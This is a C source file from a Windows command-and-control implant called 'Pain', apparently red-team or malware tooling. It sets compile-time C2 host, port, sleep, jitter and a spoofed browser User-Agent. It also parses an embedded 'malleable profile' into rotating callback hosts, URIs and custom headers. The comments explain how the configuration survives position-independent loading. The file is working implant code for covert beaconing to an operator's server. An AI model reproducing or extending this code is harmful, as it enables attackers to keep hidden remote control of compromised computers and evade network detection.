#include <windows.h>
#include <Agent.h>
#include <Defines.h>
#include <Internals.h>

// Default C2 config baked at compile time.
// Override via Makefile: make PAIN_C2_HOST='"10.0.0.1"' PAIN_C2_PORT=443
// All arrays live in .text$B (DECLFN) so they survive the linker script.
// Access them at runtime with G_SYM(g_C2Host) etc. - never use the raw symbol name.

#ifndef PAIN_C2_HOST
#define PAIN_C2_HOST "127.0.0.1"
#endif

#ifndef PAIN_C2_PORT
#define PAIN_C2_PORT 8080
#endif

#ifndef PAIN_SLEEP
#define PAIN_SLEEP 5
#endif

#ifndef PAIN_JITTER
#define PAIN_JITTER 0
#endif

#ifndef PAIN_C2_SSL
#define PAIN_C2_SSL 0
#endif

#ifndef PAIN_AGENT_UUID
#define PAIN_AGENT_UUID "00000000-0000-0000-0000-000000000001"
#endif

#ifndef PAIN_USER_AGENT
#define PAIN_USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
#endif

DECLFN char g_C2Host[]  = PAIN_C2_HOST;
DECLFN char g_UserAgent[]  = PAIN_USER_AGENT;
DECLFN char g_AgentUUID[]  = PAIN_AGENT_UUID;
DECLFN char g_WininetDll[]  = "wininet.dll";

struct PAIN_BUILD_CFG_T {
    UINT16 Port;
    ULONG  Sleep;
    ULONG  Jitter;
    BOOL   Ssl;
};

DECLFN PAIN_BUILD_CFG_T g_BuildCfg = {
    .Port   = PAIN_C2_PORT,
    .Sleep  = PAIN_SLEEP,
    .Jitter = PAIN_JITTER,
    .Ssl    = PAIN_C2_SSL,
};

// Malleable profile blob - injected at build time by the agent builder.
// When no profile is provided, PAIN_CALLBACK_COUNT == 0 and Malleable_Init() is a no-op.
#ifndef PAIN_MALLEABLE_BYTES
#define PAIN_MALLEABLE_BYTES {0x00}
#endif

#ifndef PAIN_CALLBACK_COUNT
#define PAIN_CALLBACK_COUNT 0
#endif

#ifndef PAIN_ROTATION
#define PAIN_ROTATION 0
#endif

DECLFN BYTE   g_MalleableBytes[]  = PAIN_MALLEABLE_BYTES;
DECLFN UINT32 g_CallbackCount     = PAIN_CALLBACK_COUNT;
DECLFN UINT32 g_RotationStrategy  = PAIN_ROTATION;

// Malleable_Init lives here (same TU as the globals) so the compiler uses
// RIP-relative addressing for g_MalleableBytes/g_CallbackCount/g_RotationStrategy.
// Cross-TU access goes through .refptr stubs that hold unrelocated linked addresses, breaking G_SYM.  Same-TU access uses [rip+offset] - no G_SYM needed.

static inline UINT32 mal_rd32( BYTE* p )
{
    return (UINT32)p[0] | ((UINT32)p[1]<<8) | ((UINT32)p[2]<<16) | ((UINT32)p[3]<<24);
}
static inline UINT16 mal_rd16( BYTE* p )
{
    return (UINT16)p[0] | ((UINT16)p[1]<<8);
}

DECLFN_CODE VOID Malleable_Init()
{
    G_AGENT;
    Self->Ntdll.DbgPrint( "[Pain] Malleable_Init: start\n" );

    // Direct read - same TU, RIP-relative, correct at runtime (no G_SYM needed)
    UINT32 count    = g_CallbackCount;
    UINT32 strategy = g_RotationStrategy;

    Self->Ntdll.DbgPrint( "[Pain] Malleable_Init: count=%d strategy=%d\n",
                          (int)count, (int)strategy );

    if ( count == 0 ) {
        Self->Ntdll.DbgPrint( "[Pain] Malleable_Init: no-op (legacy single-host mode)\n" );
        return;
    }

    if ( count > PAIN_MAX_CALLBACKS )
        count = PAIN_MAX_CALLBACKS;

    Self->Config.Callbacks = (PAIN_CALLBACK*)Heap_Alloc( count * sizeof(PAIN_CALLBACK) );
    if ( !Self->Config.Callbacks ) return;

    // Direct pointer to blob - same TU, correct runtime address
    BYTE* p = g_MalleableBytes;

    for ( UINT32 i = 0; i < count; i++ ) {
        UINT32 host_len = mal_rd32(p); p += 4;
        PCHAR  host     = (PCHAR)Heap_Alloc( host_len + 1 );
        if ( host ) { Mem_Copy( host, p, host_len ); host[host_len] = '\0'; }
        p += host_len;

        UINT16 port = mal_rd16(p); p += 2;
        BOOL   ssl  = ( *p != 0 );  p += 1;

        UINT32 ua_len = mal_rd32(p); p += 4;
        PCHAR  ua     = (PCHAR)Heap_Alloc( ua_len + 1 );
        if ( ua ) { Mem_Copy( ua, p, ua_len ); ua[ua_len] = '\0'; }
        p += ua_len;

        UINT32 uri_len = mal_rd32(p); p += 4;
        PCHAR  uri     = (PCHAR)Heap_Alloc( uri_len + 1 );
        if ( uri ) { Mem_Copy( uri, p, uri_len ); uri[uri_len] = '\0'; }
        p += uri_len;

        // Custom request headers
        UINT16 hdr_count = mal_rd16(p); p += 2;
        if ( hdr_count > PAIN_MAX_HEADERS ) hdr_count = PAIN_MAX_HEADERS;
        for ( UINT16 j = 0; j < hdr_count; j++ ) {
            UINT32 name_len = mal_rd32(p); p += 4;
            PCHAR  name     = (PCHAR)Heap_Alloc( name_len + 1 );
            if ( name ) { Mem_Copy( name, p, name_len ); name[name_len] = '\0'; }
            p += name_len;
            UINT32 val_len  = mal_rd32(p); p += 4;
            PCHAR  val      = (PCHAR)Heap_Alloc( val_len + 1 );
            if ( val  ) { Mem_Copy( val,  p, val_len  ); val[val_len]   = '\0'; }
            p += val_len;
            Self->Config.Callbacks[i].Headers[j].Name  = name;
            Self->Config.Callbacks[i].Headers[j].Value = val;
        }

        Self->Config.Callbacks[i].Host        = host;
        Self->Config.Callbacks[i].Port        = port;
        Self->Config.Callbacks[i].Ssl         = ssl;
        Self->Config.Callbacks[i].UserAgent   = ua;
        Self->Config.Callbacks[i].Uri         = uri;
        Self->Config.Callbacks[i].HeaderCount = hdr_count;

        Self->Ntdll.DbgPrint( "[Pain] Callback[%d]: host=%s port=%d ssl=%d hdrs=%d\n",
                              i, host ? host : "?", (INT32)port, (INT32)ssl, (INT32)hdr_count );
    }

    Self->Config.CallbackCount     = count;
    Self->Config.CallbackIndex     = 0;
    Self->Config.ActiveCallbackIdx = 0;
    Self->Config.RotationStrategy  = strategy;
    Self->Config.RngState          = Self->Session.ProcessID ^ Self->Session.ThreadID;

    Self->Config.Host      = Self->Config.Callbacks[0].Host;
    Self->Config.Port      = Self->Config.Callbacks[0].Port;
    Self->Config.Ssl       = Self->Config.Callbacks[0].Ssl;
    Self->Config.UserAgent = Self->Config.Callbacks[0].UserAgent;

    Self->Ntdll.DbgPrint( "[Pain] Malleable_Init: done - %d callbacks, rotation=%d\n",
                          count, strategy );
}
